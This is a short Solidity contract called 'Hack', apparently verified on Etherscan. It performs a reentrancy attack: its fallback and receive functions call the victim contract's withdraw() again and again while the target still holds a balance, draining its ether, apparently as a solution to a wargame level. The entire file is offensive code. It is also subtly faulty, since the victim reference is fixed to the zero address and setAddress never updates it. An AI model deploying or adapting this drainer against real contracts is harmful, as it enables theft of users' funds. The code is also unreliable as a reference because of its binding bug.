/**
 *Submitted for verification at Etherscan.io on 2022-08-18
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

interface Reentrance{
  function withdraw(uint _amount) external;
}

contract Hack {
  address public addressToHack;
  Reentrance victim = Reentrance(addressToHack);
  function setAddress(address _address) external{
    addressToHack = _address;
  }

  function grabMoney() external{
      victim.withdraw(0.001 ether);
  }

  fallback() external payable{
    if (addressToHack.balance !=0) {
        victim.withdraw(0.001 ether);
    }
  }
  
  receive() external payable{
    if (addressToHack.balance !=0) {
        victim.withdraw(0.001 ether);
    }
  }
}